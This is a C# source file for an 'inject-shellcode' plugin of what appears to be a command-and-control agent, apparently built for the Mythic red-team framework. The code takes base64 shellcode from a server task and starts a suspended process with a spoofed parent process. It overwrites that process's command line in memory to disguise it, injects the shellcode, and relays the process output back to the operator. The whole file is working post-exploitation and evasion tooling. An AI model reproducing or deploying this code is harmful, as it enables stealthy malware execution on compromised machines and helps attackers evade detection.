using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using Agent.Utilities;
using Agent.Techniques;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private ITechnique technique { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);


            if(!args.Validate(out var message))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);
            SafeFileHandle shStdOutRead;
            SafeFileHandle shStdOutWrite;
            Native.PROCESS_INFORMATION pInfo;

            //Spawn Process with or without PPID
            if (!TryCreateProcess(args, out pInfo, out shStdOutRead, out shStdOutWrite))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Failed to spawn process",
                    completed = true,
                    status = "error"
                });
            }

            if (!string.IsNullOrEmpty(args.spoofedcommandline))
            {
                TrySpoofCommandLine(args.commandline, pInfo);
            }

            await messageManager.WriteLine($"Process Started with ID: {pInfo.dwProcessId}", job.task.id, false);

            technique.Inject(buf, pInfo.hProcess);

            if (args.output && !shStdOutRead.IsInvalid)
            {
                GetProcessOutput(shStdOutRead.DangerousGetHandle(), pInfo, job.task.id);
            }

            CleanUp(shStdOutRead, shStdOutWrite, pInfo);

        }
        public Native.NTSTATUS TrySpoofCommandLine(string spoofedCmdLine, Native.PROCESS_INFORMATION PROCESS_INFORMATION_instance)
        {
            Native.PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION_instance = new Native.PROCESS_BASIC_INFORMATION();
            IntPtr ProcessHandle = Native.OpenProcess((uint)Native.ProcessAccessFlags.All, false, PROCESS_INFORMATION_instance.dwProcessId);

            uint sizePtr = 0;

            UInt32 QueryResult = Native.NtQueryInformationProcess(
                ProcessHandle,
                0,
                ref PROCESS_BASIC_INFORMATION_instance,
                Marshal.SizeOf(PROCESS_BASIC_INFORMATION_instance),
                ref sizePtr
            );

            Native.PEB PEB_instance = new Native.PEB();
            PEB_instance = (Native.PEB)FindObjectAddress(
                PROCESS_BASIC_INFORMATION_instance.PebBaseAddress,
                PEB_instance,
                ProcessHandle);

            Native.RTL_USER_PROCESS_PARAMETERS RTL_USER_PROCESS_PARAMETERS_instance = new Native.RTL_USER_PROCESS_PARAMETERS();
            RTL_USER_PROCESS_PARAMETERS_instance = (Native.RTL_USER_PROCESS_PARAMETERS)FindObjectAddress(
                PEB_instance.ProcessParameters64,
                RTL_USER_PROCESS_PARAMETERS_instance,
                ProcessHandle);

            int cmdLine_Length = 2 * spoofedCmdLine.Length;
            int cmdLine_MaximumLength = 2 * spoofedCmdLine.Length + 2;
            IntPtr real_command_addr = Marshal.StringToHGlobalUni(spoofedCmdLine);

            Native.NTSTATUS ntstatus = new Native.NTSTATUS();
            int OriginalCommand_length = (int)RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.Length;
            IntPtr com_zeroAddr = Marshal.AllocHGlobal(OriginalCommand_length);
            Native.RtlZeroMemory(com_zeroAddr, OriginalCommand_length);

            // rewrite the memory with 0x00 and then write it with real command
            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                com_zeroAddr,
                (uint)OriginalCommand_length,
                ref sizePtr);

            ntstatus = Native.NtWriteVirtualMemory(
                ProcessHandle,
                RTL_USER_PROCESS_PARAMETERS_instance.CommandLine.buffer,
                real_command_addr,
                (uint)cmdLine_Length,
                ref sizePtr);

            return ntstatus;
        }
        private Object FindObjectAddress(IntPtr BaseAddress, Object StructObject, IntPtr Handle)
        {
            IntPtr ObjAllocMemAddr = Marshal.AllocHGlobal(Marshal.SizeOf(StructObject.GetType()));
            Native.RtlZeroMemory(ObjAllocMemAddr, Marshal.SizeOf(StructObject.GetType()));

            uint getsize = 0;
            bool return_status = false;

            return_status = Native.NtReadVirtualMemory(
                Handle,
                BaseAddress,
                ObjAllocMemAddr,
                (uint)Marshal.SizeOf(StructObject),
                ref getsize
                );

            StructObject = Marshal.PtrToStructure(ObjAllocMemAddr, StructObject.GetType());
            return StructObject;
        }
        private bool TryCreateNamedPipe(ref Native.SECURITY_ATTRIBUTES saHandles, out SafeFileHandle shStdOutRead, out SafeFileHandle shStdOutWrite)
        {
            if (!Native.CreatePipe(out shStdOutRead, out shStdOutWrite, ref saHandles, 0))
            {
                return false;
            }

            if (!Native.SetHandleInformation(shStdOutRead.DangerousGetHandle(), Native.HANDLE_FLAGS.INHERIT, 0))
            {
                return false;
            }

            return true;
        }
        public bool TryCreateProcess(InjectArgs args, out Native.PROCESS_INFORMATION pi, out SafeFileHandle shStdOutRead, out SafeFileHandle shStdOutWrite)
        {
            SafeFileHandle tempWrite = new SafeFileHandle();
            SafeFileHandle tempRead = new SafeFileHandle();
            SafeFileHandle dupStdOut = new SafeFileHandle();
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            //const int SW_HIDE = 0;

            var pInfo = new Native.PROCESS_INFORMATION();
            var sInfoEx = new Native.STARTUPINFOEX();

            sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
            sInfoEx.StartupInfo.dwFlags = 1;
            var saHandles = new Native.SECURITY_ATTRIBUTES()
            {
                nLength = Marshal.SizeOf(new Native.SECURITY_ATTRIBUTES()),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero

            };

            //Add output Redirection
            if (args.output)
            {
                if (!TryCreateNamedPipe(ref saHandles, out tempRead, out tempWrite))
                {
                    pi = pInfo;
                    shStdOutRead = tempRead;
                    shStdOutWrite = tempWrite;
                    return false;
                }
                sInfoEx.StartupInfo.hStdError = tempWrite.DangerousGetHandle();
                sInfoEx.StartupInfo.hStdOutput = tempWrite.DangerousGetHandle();
            }

            //sInfoEx.StartupInfo.wShowWindow = SW_HIDE;

            IntPtr lpValue = IntPtr.Zero;

            bool result;

            try
            {
                if (args.parent > 0)
                {
                    var lpSize = IntPtr.Zero;
                    var success = Native.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                    if (success || lpSize == IntPtr.Zero)
                    {
                        pi = pInfo;
                        shStdOutRead = tempRead;
                        shStdOutWrite = tempWrite;
                        return false;
                    }

                    sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = Native.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                    if (!success)
                    {
                        pi = pInfo;
                        shStdOutRead = tempRead;
                        shStdOutWrite = tempWrite;
                        return false;
                    }

                    var parentHandle = Native.OpenProcess((uint)Native.ProcessAccessFlags.All, false, args.parent); ;

                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);

                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    if (!Native.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero))
                    {
                        pi = pInfo;
                        shStdOutRead = tempRead;
                        shStdOutWrite = tempWrite;
                        return false;
                    }

                    //Restore old StdOut handle
                    IntPtr hCurrent = Process.GetCurrentProcess().Handle;
                    IntPtr hNewParent = Native.OpenProcess(Native.ProcessAccessFlags.DuplicateHandle, true, args.parent);
                    success = Native.DuplicateHandle(hCurrent, tempWrite, hNewParent, ref dupStdOut, 0, true, Native.DUPLICATE_CLOSE_SOURCE | Native.DUPLICATE_SAME_ACCESS);
                    sInfoEx.StartupInfo.hStdError = dupStdOut.DangerousGetHandle();
                    sInfoEx.StartupInfo.hStdOutput = dupStdOut.DangerousGetHandle();

                }


                var pSec = new Native.SECURITY_ATTRIBUTES();
                var tSec = new Native.SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);


                string cmdLine = String.Empty;

                if (string.IsNullOrEmpty(args.spoofedcommandline))
                {
                    cmdLine = args.commandline;
                }
                else
                {
                    cmdLine = args.spoofedcommandline;
                }

                //To do change this to use spoof command line args
                result = Native.CreateProcess(
                    null,
                    cmdLine,
                    pSec,
                    tSec,
                    true,
                    Native.CreateProcessFlags.CREATE_SUSPENDED |
                    Native.CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT |
                    Native.CreateProcessFlags.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref sInfoEx,
                    out pInfo
                );

                //Update commandline


            }
            finally
            {
                //// Free the attribute list
                if (sInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    Native.DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    Native.CloseHandle(pInfo.hProcess);
                }
            }

            pi = pInfo;
            shStdOutRead = tempRead;
            shStdOutWrite = tempWrite;
            return result;
        }
        private bool GetProcessOutput(IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, string task_id)
        {
            CancellationTokenSource cts = new CancellationTokenSource();
            CancellationToken ct = cts.Token;
            SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
            var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), true);

            while (!ct.IsCancellationRequested) //Loop to handle process output
            {
                if (Native.WaitForSingleObject(pInfo.hProcess, 100) == 0) //If the process closed, tell the loop to stop
                {
                    cts.Cancel();
                }

                char[] buf;
                int bytesRead;
                uint bytesToRead = 0;

                if (Native.PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero)) //Check if we have bytes to read
                {
                    if (bytesToRead == 0) //We don't have any bytes to read
                    {
                        if (ct.IsCancellationRequested) //Check if we're supposed to exit
                        {
                            messageManager.WriteLine("Finished.", task_id, true);
                            break;
                        }
                        else //Process just hasn't written anything yet
                        {
                            continue;
                        }
                    }
                    else if (bytesToRead > 4096) //We limit our buffer size to 4096 to not overwhelm the agent
                    {
                        bytesToRead = 4096;
                    }

                    buf = new char[bytesToRead]; //Allocate our new char buffer

                    try
                    {
                        bytesRead = reader.Read(buf, 0, buf.Length); //Read the char buffer into our previously allocated array

                        if (bytesRead > 0) //We read some bytes, lets return it to Mythic
                        {
                            messageManager.Write(new string(buf), task_id, false);
                        }
                    }
                    catch
                    {
                        //nadda
                    }
                }
            }

            reader.Close();
            return true;
        }
        private void CleanUp(SafeFileHandle hStdOutRead, SafeFileHandle hStdOutWrite, Native.PROCESS_INFORMATION pInfo)
        {

            hStdOutRead.Dispose();
            hStdOutWrite.Dispose();

            if (pInfo.hProcess != IntPtr.Zero) //Close process and thread handles
            {
                Native.CloseHandle(pInfo.hProcess);
            }

            if (pInfo.hThread != IntPtr.Zero)
            {
                Native.CloseHandle(pInfo.hThread);
            }
        }
    }
}
